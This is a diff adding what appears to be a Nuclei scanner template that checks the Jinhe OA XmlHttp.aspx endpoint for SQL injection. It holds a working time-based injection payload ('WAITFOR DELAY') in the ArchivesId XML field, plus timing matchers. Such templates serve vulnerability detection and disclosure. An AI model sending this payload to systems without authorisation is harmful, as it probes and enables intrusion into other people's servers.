@@ -1,0 +1,42 @@
+id: jinheOA-Archives-XmlHttp-sql
+
+info:
+  name: 金和OA XmlHttp.aspx 接口存在SQL注入漏洞
+  author: jinheOA
+  severity: high
+  tags: jinheOA
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        <Root><ArchivesId>1</ArchivesId></Root>
+
+      - |
+        POST /c6/JHSoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        <Root><ArchivesId>1);WAITFOR DELAY '0:0:4'--</ArchivesId></Root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 10'
+          - 'len(body) < 10'
+        condition: and
